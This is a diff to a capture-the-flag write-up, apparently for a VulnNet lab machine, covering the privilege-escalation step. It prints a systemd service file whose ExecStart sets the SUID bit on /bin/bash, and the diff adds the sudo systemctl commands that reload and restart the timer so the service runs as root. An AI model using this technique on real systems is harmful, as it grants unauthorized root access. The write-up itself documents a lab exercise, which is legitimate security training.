@@ -68,7 +68,7 @@ Next we need to get root privileges.So we run sudo -l to see which commands the 
 
 ![](/images/MaskdMafia/node7.png)
 
-So we go to the directory which has vulnnet-auto.timer and write the following to the files.
+So we go to the directory which has vulnnet-auto.timer and write the following to the files after stopping the vulnet-auto.timer.
 
 ```py
 echo '[Unit]
@@ -95,6 +95,15 @@ ExecStart=/bin/bash -c "chmod +s /bin/bash"
 [Install]
 WantedBy=multi-user.target' > vulnnet-job.service
 ```
+
+After that we run the following commands:
+
+```py
+sudo /bin/systemctl stop vulnnet-auto.timer
+sudo /bin/systemctl daemon-reload
+sudo /bin/systemctl start vulnnet-auto.timer
+```
+
 Waited sometime and we got the root priveleges !
 Now we go to the root directory and see the contents of root.txt.
 
